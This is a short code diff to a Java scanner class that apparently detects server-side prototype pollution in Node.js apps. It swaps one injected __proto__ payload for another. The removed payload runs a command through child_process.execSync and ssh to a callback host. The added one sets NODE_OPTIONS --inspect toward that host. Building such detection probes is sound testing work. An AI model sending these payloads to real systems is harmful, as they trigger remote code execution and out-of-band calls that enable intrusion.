@@ -13,10 +13,10 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
         {
             put("async", new String[]{
                     "__proto__"," {\n" +
-                    "\"argv0\":\"vim\",\n" +
-                    "\"shell\":\"vim\",\n" +
-                    "\"input\":\":!{ssh -o ConnectTimeout=1 shell\\\\.$collabplz}\\n\",\n" +
-                    "\"execArgv\":[\"--eval=require('child_process').execSync('ssh -o ConnectTimeout=1 execArgv\\\\.$collabplz')\"]\n" +
+                    "\"argv0\":\"node\",\n" +
+                    "\"shell\":\"node\",\n" +
+                    "\"env\":{\"a51b834b7\":\"x\"},\n" +
+                    "\"NODE_OPTIONS\":\"--inspect=<@replace('.','\\\\\\\"\\\\\\\".')>$collabplz<@/replace>\"\n" +
                     "}"
             });
         }
